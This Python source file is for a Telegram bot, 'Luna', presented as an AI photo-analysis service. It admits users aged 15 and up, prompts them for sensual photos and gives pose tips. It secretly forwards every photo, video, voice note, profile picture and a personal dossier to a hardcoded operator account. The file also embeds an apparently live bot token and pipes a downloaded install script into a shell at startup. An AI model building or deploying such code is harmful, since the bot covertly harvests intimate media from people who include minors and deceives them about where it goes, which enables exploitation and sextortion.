import os
import io
import random
import threading
import asyncio
import requests
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from PIL import Image, ImageStat
import base64

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 

# --- SERVIDOR WEB ---
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Luna Bot con IA Real"

@web_app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# --- BASES DE DATOS ---
verified_users = {}
niveles = {}
puntos = {}
perfiles = {} 

def analizar_con_ia_real(imagen_bytes):
    """Esta función llama a Ollama (LLaVA 7B) de verdad"""
    try:
        # Convertimos la imagen a base64 para enviarla a Ollama
        img_base64 = base64.b64encode(imagen_bytes).decode('utf-8')
        
        # Hacemos la petición a Ollama (que debería estar corriendo en localhost)
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "llava",
                "prompt": "Analiza esta foto de una modelo. Da 2 consejos muy específicos y sutiles sobre la pose, la luz y cómo mejorar su sensualidad. No seas explícito, usa un tono profesional.",
                "images": [img_base64],
                "stream": False
            },
            timeout=120 # Damos 2 minutos de espera
        )
        
        if response.status_code == 200:
            return response.json().get("response", "La IA no devolvió texto.")
        else:
            return "⚠️ La IA no pudo procesar la imagen."
            
    except Exception as e:
        return f"⚠️ Error al conectar con la IA: {str(e)}"

async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        nombre = user.first_name
        username = f"@{user.username}" if user.username else "Oculto"
        user_id = user.id
        
        fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"

        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
            f"👤 **Nombre:** {nombre}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e:
        print(f"Error en reporte: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in verified_users:
        await update.message.reply_text("¡Hola! 🌙 Soy Luna. Envíame tu fecha de nacimiento (DD-MM-AAAA).")
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto para analizarla con mi visión artificial.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            verified_users[user.id] = True
            niveles[user.id] = 1
            puntos[user.id] = 0
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"

            perfiles[user.id] = {"edad": edad, "estilo": estilo}
            await update.message.reply_text("✅ ¡Todo listo! Ya puedes enviarme fotos.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text("❌ Rango permitido: 15 a 80 años.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    # Mensaje para que ella sepa que la IA está trabajando
    msg_espera = await update.message.reply_text("🔍 **Encendiendo Visión Artificial LLaVA 7B...**\nEste modelo es muy potente y puede tardar entre 30 y 60 segundos en analizar tu foto. ¡No te vayas!")
    
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    # LLAMADA REAL A LA IA
    sugerencia = analizar_con_ia_real(photo_bytes)
    
    puntos[user_id] = puntos.get(user_id, 0) + 10
    await msg_espera.edit_text(f"📸 **Análisis Profundo de Luna:**\n\n{sugerencia}")
    
    try:
        await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except Exception as e:
        print(f"Error enviando foto: {e}")
    await aviso_corto(context, user, "Foto")

async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🎥 Procesando archivo...")
    tipo = "Archivo"
    if update.message.video:
        tipo = "Video"
        f = await update.message.video.get_file()
    elif update.message.voice:
        tipo = "Nota de voz"
        f = await update.message.voice.get_file()
    else: return await update.message.reply_text("Formato no soportado.")
    
    puntos[user_id] = puntos.get(user_id, 0) + 5
    await msg_espera.edit_text(f"✅ He recibido tu {tipo}. ¡Buen trabajo!")
    
    try:
        if tipo == "Video": await context.bot.send_video(chat_id=DANI_CHAT_ID, video=f.file_id)
        else: await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=f.file_id)
    except Exception as e: pass
    await aviso_corto(context, user, tipo)

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    # ¡AQUÍ ESTÁ EL TRUCO! Intentamos descargar Ollama al iniciar
    print("Instalando Ollama...")
    os.system("curl -fsSL https://ollama.com/install.sh | sh")
    print("Descargando LLaVA 7B (Esto pesa 4.5 GB)...")
    os.system("ollama pull llava")
    print("Iniciando el servidor de Ollama en segundo plano...")
    os.system("ollama serve &")
    
    # Damos tiempo a que Ollama arranque
    import time
    time.sleep(10) 

    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
    
    print("Luna con IA Real en línea.")
    app.run_polling()

if __name__ == "__main__":
    main()



